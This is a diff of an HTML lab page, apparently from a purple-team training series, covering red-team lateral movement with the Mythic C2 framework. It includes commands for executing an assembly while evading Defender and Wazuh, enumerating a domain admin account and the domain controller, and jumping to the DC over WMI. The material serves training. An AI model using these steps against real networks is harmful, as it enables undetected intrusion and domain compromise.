@@ -12,7 +12,6 @@ permalink: /solo-purple-teaming/red-team-engage-lateral-movement/
 <h1>Red Team Engage - Lateral Movement</h1>
 </section>
 <section class="spt-content">
-<p>Owner: Mike Sterrett</p>
 <h2 id="overview"><strong>Overview</strong></h2>
 <p>In this exercise, we will:</p>
 <ol type="1">
@@ -51,8 +50,8 @@ to disk.</li>
 <li><strong>Steps:</strong>
 <ol type="1">
 <li><p>In <strong>Windows RE</strong> session, run:</p>
-<pre><code>register assembly
-</code></pre></li>
+register assembly
+</li>
 <li><p>Use the modal to upload
 <code>service_scan_demo.exe</code>.</p></li>
 <li><p>In Mythic, set <strong>Injection Technique</strong>:</p>
@@ -64,8 +63,8 @@ to disk.</li>
 <li>Use modal → set to <code>smartscreen</code>.</li>
 </ul></li>
 <li><p>Execute the assembly:</p>
-<pre><code>execute assembly service_scan_demo.exe
-</code></pre></li>
+execute assembly service_scan_demo.exe
+</li>
 <li><p>Verify in Wazuh dashboard → no detections.</p></li>
 <li><p>Check assume breach host → confirm Defender doesn’t flag
 it.</p></li>
@@ -134,8 +133,8 @@ class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-
 Verification</strong></h2>
 <ul>
 <li><p>Check group membership:</p>
-<pre><code>shell net user SVC_ecoin_sync /domain
-</code></pre></li>
+shell net user SVC_ecoin_sync /domain
+</li>
 <li><p>Confirm membership in <strong>Domain Admins</strong>.</p></li>
 </ul>
 <hr />
@@ -143,11 +142,11 @@ Verification</strong></h2>
 Movement to Domain Controller</strong></h2>
 <ul>
 <li><p>Identify DC:</p>
-<pre><code>shell nltest /dsgetdc:ecoin
-</code></pre></li>
+shell nltest /dsgetdc:ecoin
+</li>
 <li><p>Use <strong>jump wmi</strong> in Mythic:</p>
-<pre><code>jump wmi 10.0.2.2
-</code></pre>
+jump wmi 10.0.2.2
+
 <ul>
 <li>Builds Apollo WinExe.</li>
 <li>Copies to admin share.</li>
@@ -155,8 +154,8 @@ Movement to Domain Controller</strong></h2>
 </ul></li>
 <li><p>Interact with the new callback from DC.</p></li>
 <li><p>Verify:</p>
-<pre><code>shell hostname
-</code></pre>
+shell hostname
+
 <p>Confirm <code>ecoin-DC1</code>.</p></li>
 </ul>
 <hr />
